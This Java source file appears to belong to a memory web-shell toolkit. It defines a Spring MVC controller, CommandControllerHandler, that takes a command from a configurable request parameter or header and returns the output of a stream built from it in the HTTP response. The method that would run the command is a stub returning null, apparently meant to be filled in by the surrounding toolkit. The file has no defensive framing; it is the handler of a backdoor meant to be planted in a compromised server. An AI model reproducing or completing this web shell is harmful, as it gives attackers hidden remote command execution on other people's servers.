package com.reajason.javaweb.memshell.shelltool.command;

import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.mvc.Controller;

import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.util.Scanner;

/**
 * @author ReaJason
 * @since 2024/12/22
 */
public class CommandControllerHandler implements Controller {
    public static String paramName;

    public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception {
        try {
            String p = request.getParameter(paramName);
            if (p == null || p.isEmpty()) {
                p = request.getHeader(paramName);
            }
            if (p != null) {
                String param = getParam(p);
                InputStream inputStream = getInputStream(param);
                response.getWriter().write(new Scanner(inputStream).useDelimiter("\\A").next());
                response.getWriter().flush();
                response.getWriter().close();
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return null;
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }
}
